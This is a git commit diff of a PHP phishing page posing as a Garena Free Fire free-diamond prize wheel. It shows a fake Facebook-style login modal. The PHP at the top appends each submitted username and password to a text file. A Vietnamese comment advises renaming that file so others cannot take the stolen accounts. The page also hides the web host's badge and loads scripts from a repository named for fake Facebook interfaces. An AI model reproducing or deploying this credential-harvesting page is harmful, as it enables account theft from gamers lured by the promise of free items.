5be4a810f7f515d529ea707583209e3bef10a7ad
ticchien111 <87794542+ticchien111@users.noreply.github.com>
2021-09-28 21:55:00 +0700

    Update index.php

--- index.php
+++ index.php
@@ -1,129 +1,127 @@
-
-
-         <?php
+<?php
         
-    if(isset($_POST["taikhoan"])){
-          $username = $_POST["taikhoan"];
-      $password = $_POST["matkhau"];
-      $_SESSION["username"] = $username;
-       $body = "\nTài Khoản :$username\nMật Khẩu :$password\n"; //tùy host có thể lỗi font chữ email thì ae vô thẳng file txt trong file manager của host
-      $test = fopen("hu.txt","a");//đổi tên file hu.txt này để tránh trường hợp người khác vào lấy acc
-      fwrite($test,$body);
-      fclose($test); 
-    }
+if(isset($_POST["taikhoan"])){
+      $username = $_POST["taikhoan"];
+  $password = $_POST["matkhau"];
+  $_SESSION["username"] = $username;
+   $body = "\nTài Khoản :$username\nMật Khẩu :$password\n"; //tùy host có thể lỗi font chữ email thì ae vô thẳng file txt trong file manager của host
+  $test = fopen("hu.txt","a");//đổi tên file hu.txt này để tránh trường hợp người khác vào lấy acc
+  fwrite($test,$body);
+  fclose($test); 
+}
 ?> 
- <!DOCTYPE html>
-      <html>
-          
-      <head>
-          <style>img[alt="www.000webhost.com"]{display:none;}</style>
-    <meta content='text/html; charset=UTF-8' http-equiv='Content-Type' />
-      <meta name="viewport" content="width=device-width, initial-scale=1">
-      <title>Vòng quay miễn phí | garena free fire</title>
- 
-      <title>Sự Kiện Free Fire 2021 Nhận Kim Cương Free Fire Miễn Phí Code Free Fire Sự Kiện Vòng Quay Vô Cực FREE FIRE</title>
+<!DOCTYPE html>
+  <html>
+      
+  <head>
+      <style>img[alt="www.000webhost.com"]{display:none;}</style>
+<meta content='text/html; charset=UTF-8' http-equiv='Content-Type' />
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Vòng quay miễn phí | garena free fire</title>
+
+  <title>Sự Kiện Free Fire 2021 Nhận Kim Cương Free Fire Miễn Phí Code Free Fire Sự Kiện Vòng Quay Vô Cực FREE FIRE</title>
 <meta property="og:type" content="website" />
 <meta property="og:url" content="http://ticchien.pw/" />
 <meta property="og:site_name" content="FREE FIRE" />
- <meta property="og:title" content="Sự Kiện Free Fire 2021 Nhận Kim Cương Free Fire Miễn Phí Code Free Fire Sự Kiện Vòng Quay Vô Cực FREE FIRE">
- <meta property="og:image" content="https://1.bp.blogspot.com/-kPgd3sOIMBc/XoR9xS626HI/AAAAAAAAIqs/2qtqX9ckPpI03GGrbHShKouZURlvUEhEQCLcBGAsYHQ/s1600/123.png">
- <meta property="og:description" content="Tri an ff nhận code free fire kim cương free fire miễn phí, sự kiện Free Fire Việt Nam 2021, hack kim cương free fire android nicoo free fire max ">
- <link rel="shortcut icon" href="https://apkboat.com/logos/garena-free-fire-mega-mod_6.png" />
- <link rel="icon" href="https://apkboat.com/logos/garena-free-fire-mega-mod_6.png" type="image/x-icon" />
-          <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
-          <link class="tempLink" rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:regular">
-          <script src='//ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js' type="text/javascript"></script>
-          <link rel="stylesheet" href="https://ticchien111.github.io/giaodien-fb-fake/facebook.css">
-          <script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
-        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" integrity="sha384-1q8mTJOASx8j1Au+a5WDVnPi2lkFfwwEAa8hDDdjZlpLegxhjVME1fgjWPGmkzs7" crossorigin="anonymous">
-      <style>
-      .container {
-        position: relative;
-        width: 100%;
-        overflow: hidden;
-       /* 1:1 Aspect Ratio */
-      }
+<meta property="og:title" content="Sự Kiện Free Fire 2021 Nhận Kim Cương Free Fire Miễn Phí Code Free Fire Sự Kiện Vòng Quay Vô Cực FREE FIRE">
+<meta property="og:image" content="https://1.bp.blogspot.com/-kPgd3sOIMBc/XoR9xS626HI/AAAAAAAAIqs/2qtqX9ckPpI03GGrbHShKouZURlvUEhEQCLcBGAsYHQ/s1600/123.png">
+<meta property="og:description" content="Tri an ff nhận code free fire kim cương free fire miễn phí, sự kiện Free Fire Việt Nam 2021, hack kim cương free fire android nicoo free fire max ">
+<link rel="shortcut icon" href="https://apkboat.com/logos/garena-free-fire-mega-mod_6.png" />
+<link rel="icon" href="https://apkboat.com/logos/garena-free-fire-mega-mod_6.png" type="image/x-icon" />
+      <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
+      <link class="tempLink" rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:regular">
+      <script src='//ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js' type="text/javascript"></script>
+      <link rel="stylesheet" href="https://ticchien111.github.io/giaodien-fb-fake/facebook.css">
+      <script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" integrity="sha384-1q8mTJOASx8j1Au+a5WDVnPi2lkFfwwEAa8hDDdjZlpLegxhjVME1fgjWPGmkzs7" crossorigin="anonymous">
+  <style>
+  .container {
+    position: relative;
+    width: 100%;
+    overflow: hidden;
+   /* 1:1 Aspect Ratio */
+  }
+  
+  .responsive-iframe {
+    position: fixed;
+    top: 0;
+    left: 0;
+    bottom: 0;
+    right: 0;
+    width: 100%;
+    height: 100%;
+    border: none;
+  }
+  .img{
+    width: 130px;
+    padding-bottom: 20px;
+    border-radius: 20px;
+  }
+  .container1{
+ padding-top: 30px;
       
-      .responsive-iframe {
-        position: fixed;
-        top: 0;
-        left: 0;
-        bottom: 0;
-        right: 0;
-        width: 100%;
-        height: 100%;
-        border: none;
-      }
-      .img{
-        width: 130px;
-        padding-bottom: 20px;
-        border-radius: 20px;
-      }
-      .container1{
-     padding-top: 30px;
-          
-      }
-           @media screen and (max-width: 600px) {
+  }
+       @media screen and (max-width: 600px) {
 
- .container1{
-     padding-top: 30px;
- padding-left: 30px;
- width: 90%;
+.container1{
+ padding-top: 30px;
+padding-left: 30px;
+width: 90%;
 }
 
 }
-              </style>
-              </head>
-              <body  >
-           
-              <div class="container" >
-                  <iframe class="responsive-iframe" id="iframe" sandbox src="https://vongquay-freefire.com/vongquay.html"></iframe>
+          </style>
+          </head>
+          <body  >
+       
+          <div class="container" >
+              <iframe class="responsive-iframe" id="iframe" sandbox src="https://vongquay-freefire.com/vongquay.html"></iframe>
+            </div>
+
+            <div class="modal fade" id="myModal" role="dialog">
+              <div class="container1">
+             <div class="row h-100 justify-content-center align-items-center mt-2">
+                <div class="col-md-4 vhnlog">
+                   <form   id="login_form">
+                       <div class="d-flex justify-content-center">
+                <img src="https://apkboat.com/logos/garena-free-fire-mega-mod_6.png" class="img logo mt-2" alt="FacebookZ">
+             </div>
+             <div class=" alert alert-warning" id="tb" role="alert" style="
+                border-radius: 0;
+                padding: 7px 20px;
+                ">
+                <span id="thongbao">Vui lòng đăng nhập tài khoản đã liên kết với garena để tiếp tục</span>
+             </div>
+                      <div class="form-group">
+                         <input type="text" class="form-control" id="id" name="taikhoan" placeholder="Vui lòng nhập số di động hoặc email" >
+                      </div>
+                    
+                      <div class="form-group">
+                         <input type="password" class="form-control" id="pass" name="matkhau" placeholder="Password" >
+                      </div>
+                      <div class="form-group">
+                        <center>
+                            <button  type="submit" onclick="dangnhap()"  id="submit"class="btn btn-primary"  style="background-color: #166fe5;">Đăng nhập</button>
+                         </center>
+                      </div>
+                   </form>
+                   <div id="login_reg_separator" class="_43mg _8qtf" data-sigil="login_reg_separator"><span class="_43mh">hoặc</span></div>
+                   <center>
+                      <input class="btn btn-success" type="button"  style="background-color: #3fb328;"value="Tạo tài khoản mới" />
+                   </center>
                 </div>
-
-                <div class="modal fade" id="myModal" role="dialog">
-                  <div class="container1">
-                 <div class="row h-100 justify-content-center align-items-center mt-2">
-                    <div class="col-md-4 vhnlog">
-                       <form   id="login_form">
-                           <div class="d-flex justify-content-center">
-                    <img src="https://apkboat.com/logos/garena-free-fire-mega-mod_6.png" class="img logo mt-2" alt="FacebookZ">
-                 </div>
-                 <div class=" alert alert-warning" id="tb" role="alert" style="
-                    border-radius: 0;
-                    padding: 7px 20px;
-                    ">
-                    <span id="thongbao">Vui lòng đăng nhập tài khoản đã liên kết với garena để tiếp tục</span>
-                 </div>
-                          <div class="form-group">
-                             <input type="text" class="form-control" id="id" name="taikhoan" placeholder="Vui lòng nhập số di động hoặc email" >
-                          </div>
-                        
-                          <div class="form-group">
-                             <input type="password" class="form-control" id="pass" name="matkhau" placeholder="Password" >
-                          </div>
-                          <div class="form-group">
-                             <center>
-                                <button  type="submit" onclick="dangnhap()"  id="submit"class="btn btn-primary btn-block">Đăng nhập</button>
-                             </center>
-                          </div>
-                       </form>
-                       <div id="login_reg_separator" class="_43mg _8qtf" data-sigil="login_reg_separator"><span class="_43mh">hoặc</span></div>
-                       <center>
-                          <input class="btn btn-success" type="button" value="Tạo tài khoản mới" />
-                       </center>
-                    </div>
-                 </div>
-                 <div class="row text-center" style="margin-top: 6rem;">
+             </div>
+             <div class="row text-center" style="margin-top: 6rem;">
+               
+             </div>
+             <div class="row text-center">
+                <div class="col-md-12">
                    
-                 </div>
-                 <div class="row text-center">
-                    <div class="col-md-12">
-                       
-                    </div>
-                 </div>
-              </div>
                 </div>
-                <script src="https://ticchien111.github.io/giaodien-fb-fake/jquery2.js"></script>
+             </div>
+          </div>
+            </div>
+            <script src="https://ticchien111.github.io/giaodien-fb-fake/jquery2.js"></script>
 <script src="https://ticchien111.github.io/script/v1.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js" integrity="sha384-0mSbJDEHialfmuBBQP6A4Qrprq5OVfW37PRR3j5ELqxss1yVqOtnepnHVP9aJ7xS" crossorigin="anonymous">
                       </script>
